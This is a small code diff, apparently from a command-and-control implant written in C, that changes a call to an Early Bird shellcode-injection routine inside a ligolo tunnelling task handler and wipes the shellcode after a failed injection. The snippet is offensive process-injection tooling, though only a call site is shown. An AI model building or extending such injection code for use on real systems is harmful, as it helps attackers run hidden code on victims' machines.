@@ -263,7 +263,7 @@ static void ligolo_impl(char *task_id, char *params, const char *action) {
 
         EarlyBirdResult inj  = {0};
         char            injerr[256] = {0};
-        if (!earlybird_inject(shellcode, shellcode_len, cmdline_buf, &inj, injerr, sizeof(injerr))) {
+        if (!earlybird_inject(shellcode, shellcode_len, cmdline_buf, 0, &inj, injerr, sizeof(injerr))) {
             SecureZeroMemory(shellcode, shellcode_len); free(shellcode);
             send_task_response(task_id, injerr);
             return;
